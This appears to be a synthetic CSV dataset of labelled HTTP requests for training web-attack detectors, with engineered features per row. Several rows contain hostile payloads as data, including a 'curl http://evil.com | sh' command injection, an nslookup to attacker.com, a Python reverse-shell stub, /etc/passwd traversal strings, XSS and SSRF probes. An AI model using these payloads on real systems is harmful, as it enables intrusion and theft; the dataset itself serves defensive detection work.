timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-22 22:08:04,198.51.100.160,34.120.45.67,https,get,https://google.account-verify.com/login?redirect=/dashboard,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,4105,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,google.account-verify.com,typosquatting_url_spoofing,22,6,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,59,1,9,0,0,0,0,0,0,0,0,25,0,0,0,0,0,0,0,google.account-verify.com,4xx,1,0,0,164.2,0,25,164.2,6,0.6666666666666666,0,1010,589,0,1,0,81,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01694915254237288,0,0,0,1,0,2026-03-22 22:08:00,1,0.8333333333333334
2026-03-16 20:15:02,185.199.108.97,104.18.24.12,http,post,/login,"{""Host"":""52.45.123.89"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",username=john&password=Summer2023,404,5935,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,username=john&password=summer2023,credential_stuffing_brute_force,20,0,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,XSStrike/3.1.5,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,33,33,1,0,0,0,0,0,username=john&password=summer2023username=john&password=Summer2023,4xx,1,0,0,179.84848484848484,0,66,89.92424242424242,3,1.0,1,986,617,1,0,0,14,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.030303030303030304,0.0,0,0,0,1,0,2026-03-16 20:15:00,1,0.6666666666666666
2026-03-15 23:48:53,192.168.1.42,203.0.113.45,http,get,/download?file=/etc/passwd,"{""Host"":""198.51.100.23"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,200,7112,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,/etc/passwd,directory_traversal,23,6,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,XSStrike/3.1.5,*/*,text/html,nginx,26,1,5,0,0,0,1,0,0,0,0,11,0,0,0,0,0,0,0,/etc/passwd,2xx,0,1,0,646.5454545454545,0,11,646.5454545454545,9,0.7777777777777778,0,1028,611,1,0,0,14,nginx,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.038461538461538464,0,0,0,1,1,2026-03-15 23:48:00,1,0.3333333333333333
2026-03-12 07:31:43,172.16.0.186,203.0.113.45,http,get,/products,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,2816,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,7,3,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx,9,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,2816.0,15,0.5333333333333333,0,1028,611,0,1,0,91,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-12 07:31:00,1,0.26666666666666666
2026-03-06 04:43:41,10.0.0.33,198.51.100.23,https,post,/login,"{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",email=test24@test.com&password=123456,401,6022,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,email=test24@test.com&password=123456,credential_stuffing_brute_force,4,4,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,BurpSuite/2023.12,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,1,37,37,1,0,0,0,0,0,email=test24@test.com&password=123456email=test24@test.com&password=123456,4xx,1,0,0,162.75675675675674,0,74,81.37837837837837,14,0.6428571428571429,0,1056,656,1,0,0,17,Apache,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.02702702702702703,0.0,0,0,0,1,0,2026-03-06 04:43:00,1,0.6428571428571429
2026-03-20 10:16:14,172.16.0.150,104.18.24.12,http,get,/ping?ip=127.0.0.1--file=/etc/passwd,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,401,1407,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,--file=/etc/passwd,command_injection,10,4,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,XSStrike/3.1.5,*/*,text/html,IIS,36,1,11,1,0,0,1,1,0,1,0,18,0,0,0,0,0,0,0,--file=/etc/passwd,4xx,1,0,0,78.16666666666667,0,18,78.16666666666667,11,0.6363636363636364,0,986,617,1,0,0,14,IIS,0.5,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.027777777777777776,0,0,0,1,1,2026-03-20 10:16:00,1,0.45454545454545453
2026-03-14 13:25:23,104.18.24.210,192.168.1.1,http,post,/products,"{""Host"":""172.67.128.45"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",comment=Great article!,200,3309,"{""Content-Type"":""text/html"",""Server"":""Apache""}",wget/1.21.2,,normal,13,5,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,wget/1.21.2,*/*,text/html,Apache,9,0,1,0,0,0,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,150.4090909090909,2,0.0,0,997,619,0,0,1,11,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-14 13:25:00,1,0.0
2026-03-08 18:57:34,192.168.1.208,192.168.1.1,https,get,/traceroute?host=&& curl http://evil.com | sh,"{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,500,7536,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,&& curl http://evil.com | sh,command_injection,18,6,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,BurpSuite/2023.12,*/*,text/html,IIS,45,3,8,0,0,1,0,0,0,0,0,28,0,3,0,0,0,0,0,&& curl http://evil.com | sh,5xx,1,0,0,269.14285714285717,0,28,269.14285714285717,8,0.625,0,997,619,1,0,0,17,IIS,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.10714285714285714,0.06666666666666667,0,0,0,1,0,2026-03-08 18:57:00,1,0.5
2026-03-15 14:56:28,198.51.100.9,203.0.113.45,https,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,4061,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,14,6,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS,55,1,10,0,0,0,0,0,0,0,0,32,0,0,0,0,1,0,0,..%5c..%5c..%5cwindows%5cwin.ini,4xx,1,0,0,126.90625,0,32,126.90625,2,1.0,1,1028,611,0,1,0,91,IIS,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01818181818181818,0,0,0,1,1,2026-03-15 14:56:00,1,0.5
2026-03-15 07:57:34,10.0.0.138,52.45.123.89,http,get,"/traceroute?host=; python -c 'import socket,subprocess,os'","{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,401,1693,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"; python -c 'import socket,subprocess,os'",command_injection,7,6,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS,58,1,4,0,0,1,0,0,0,0,0,41,0,3,0,0,0,0,0,"; python -c 'import socket,subprocess,os'",4xx,1,0,0,41.292682926829265,0,41,41.292682926829265,15,0.6666666666666666,0,993,582,0,1,0,81,IIS,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.07317073170731707,0.017241379310344827,0,0,0,1,0,2026-03-15 07:57:00,1,0.5333333333333333
2026-03-11 08:47:40,198.51.100.59,198.51.100.23,http,get,/products,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,1291,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,8,2,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",34.120.45.67,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare,9,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1291.0,5,0.6,0,1056,656,0,1,0,80,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-11 08:47:00,1,0.4
2026-03-12 12:30:45,10.0.0.106,198.51.100.23,https,get,/proxy?target=http://127.0.0.1.nip.io,"{""Host"":""104.18.24.12"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,500,380,"{""Content-Type"":""text/html"",""Server"":""Apache""}",SQLmap/1.8.4,http://127.0.0.1.nip.io/,ssrf,12,3,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,SQLmap/1.8.4,*/*,text/html,Apache,37,1,10,0,0,0,0,1,0,1,0,24,0,0,0,0,0,0,0,http://127.0.0.1.nip.io/,5xx,1,0,0,15.833333333333334,0,24,15.833333333333334,12,0.5,0,1056,656,1,0,0,12,Apache,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.02702702702702703,0,0,0,1,0,2026-03-12 12:30:00,1,0.4166666666666667
2026-03-03 23:32:35,10.0.0.211,172.67.128.45,https,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,200,1959,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,23,1,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Nmap Scripting Engine,*/*,text/html,Apache,55,1,10,0,0,0,0,0,0,0,0,32,0,0,0,0,1,0,0,..%5c..%5c..%5cwindows%5cwin.ini,2xx,0,1,0,61.21875,0,32,61.21875,8,0.625,0,1020,627,1,0,0,21,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01818181818181818,0,0,0,1,1,2026-03-03 23:32:00,1,0.375
2026-03-20 14:15:02,192.168.1.83,3.12.45.78,https,get,/download?file=/etc/passwd,"{""Host"":""104.18.24.12"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,6596,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,/etc/passwd,directory_traversal,14,4,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,XSStrike/3.1.5,*/*,text/html,nginx,26,1,5,0,0,0,1,0,0,0,0,11,0,0,0,0,0,0,0,/etc/passwd,4xx,1,0,0,599.6363636363636,0,11,599.6363636363636,10,0.5,0,951,546,1,0,0,14,nginx,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.038461538461538464,0,0,0,1,1,2026-03-20 14:15:00,1,0.4
2026-03-22 13:01:03,172.16.0.56,198.51.100.23,http,get,/css/style.css,"{""Host"":""10.0.0.1"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,2127,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,13,6,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,curl/7.81.0,*/*,text/html,nginx,14,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,2127.0,5,0.4,0,1056,656,0,0,1,11,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-22 13:01:00,1,0.4
2026-03-24 19:36:05,172.67.128.145,104.18.24.12,https,get,/fetch?url=http://burp-collaborator.net,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,726,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,http://burp-collaborator.net,ssrf,19,1,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS,39,1,7,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,0,http://burp-collaborator.net,2xx,0,1,0,25.928571428571427,0,28,25.928571428571427,3,0.6666666666666666,0,986,617,0,1,0,81,IIS,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.02564102564102564,0,0,0,1,0,2026-03-24 19:36:00,1,0.3333333333333333
2026-03-17 15:22:19,198.51.100.25,104.18.24.12,http,get,/traceroute?host=| nslookup attacker.com,"{""Host"":""104.18.24.12"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,404,4759,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,| nslookup attacker.com,command_injection,15,1,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,XSStrike/3.1.5,*/*,text/html,IIS,40,1,4,0,0,1,0,0,0,0,0,23,0,1,0,0,0,0,0,| nslookup attacker.com,4xx,1,0,0,206.91304347826087,0,23,206.91304347826087,3,0.6666666666666666,0,986,617,1,0,0,14,IIS,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.043478260869565216,0.025,0,0,0,1,0,2026-03-17 15:22:00,1,0.6666666666666666
2026-03-06 05:40:20,10.0.0.25,10.0.0.1,https,get,/search?q=<<script>alert(1)//<</script>,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,500,3830,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,<<script>alert(1)//<</script>,xss,5,4,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS,39,1,6,0,1,0,0,0,0,0,0,29,0,6,0,2,0,0,0,<<script>alert(1)//<</script>,5xx,1,0,0,132.06896551724137,0,29,132.06896551724137,12,0.75,0,998,578,0,1,0,80,IIS,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.20689655172413793,0.02564102564102564,0,0,0,1,0,2026-03-06 05:40:00,1,0.5833333333333334
2026-03-11 22:30:36,192.168.1.142,198.51.100.23,https,get,/download/file.pdf,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,1437,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,22,2,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",52.45.123.89,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Cloudflare,18,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1437.0,11,0.5454545454545454,0,1056,656,0,0,0,66,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-11 22:30:00,1,0.36363636363636365
2026-03-14 08:21:59,172.16.0.40,10.0.0.1,http,get,/download?file=..%252f..%252f..%252fetc%252fpasswd,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,500,6252,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,..%2f..%2f..%2fetc%2fpasswd,directory_traversal,8,5,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",34.120.45.67,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS,50,1,9,0,0,0,0,0,0,0,0,27,0,0,0,0,1,0,0,..%2f..%2f..%2fetc%2fpasswd,5xx,1,0,0,231.55555555555554,0,27,231.55555555555554,7,0.5714285714285714,0,998,578,0,1,0,80,IIS,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.02,0,0,0,1,1,2026-03-14 08:21:00,1,0.42857142857142855
2026-03-03 11:18:14,10.0.0.129,104.18.24.12,https,post,/images/logo.png,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",search_query=laptops,404,1210,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,11,1,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,nginx,16,0,3,0,0,0,0,0,0,0,0,0,20,0,0,0,0,1,0,search_query=laptops,4xx,1,0,0,0.0,0,20,60.5,10,0.5,0,986,617,0,1,0,66,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-03 11:18:00,1,0.4
2026-03-22 14:01:36,10.0.0.232,10.0.0.1,http,post,/comment,"{""Host"":""192.168.1.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",comment=prompt%28%27Enter%20your%20password%3A%27%2C%20%27password%27%29,403,3092,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,"prompt('enter your password:', 'password')",xss,14,6,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,SQLmap/1.8.4,*/*,text/html,nginx,8,0,1,0,0,0,0,0,0,0,0,42,72,4,0,1,0,0,0,"prompt('enter your password:', 'password')comment=prompt%28%27Enter%20your%20password%3A%27%2C%20%27password%27%29",4xx,1,0,0,73.61904761904762,0,114,27.12280701754386,5,1.0,1,998,578,1,0,0,12,nginx,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.09523809523809523,0.0,0,0,0,1,0,2026-03-22 14:01:00,1,0.8
2026-03-01 15:29:10,10.0.0.195,34.120.45.67,https,post,/comment,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",comment=%3Cscri%3Cscript%3Ept%3Ealert%281%29%3C/scri%3C/script%3Ept%3E,200,6042,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,<scri<script>pt>alert(1)</scri</script>pt>,xss,15,6,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache,8,0,1,0,0,0,0,0,0,0,0,42,70,8,0,2,0,0,0,<scri<script>pt>alert(1)</scri</script>pt>comment=%3Cscri%3Cscript%3Ept%3Ealert%281%29%3C/scri%3C/script%3Ept%3E,2xx,0,1,0,143.85714285714286,0,112,53.94642857142857,16,0.5,0,1010,589,0,1,0,80,Apache,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.19047619047619047,0.0,0,0,0,1,0,2026-03-01 15:29:00,1,0.3125
2026-03-01 21:25:02,185.199.108.180,52.45.123.89,http,get,/download/file.pdf,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,404,3926,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,21,6,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Apache,18,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,4xx,1,0,0,0.0,0,1,3926.0,1,0.0,0,993,582,0,1,0,66,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-01 21:25:00,1,1.0
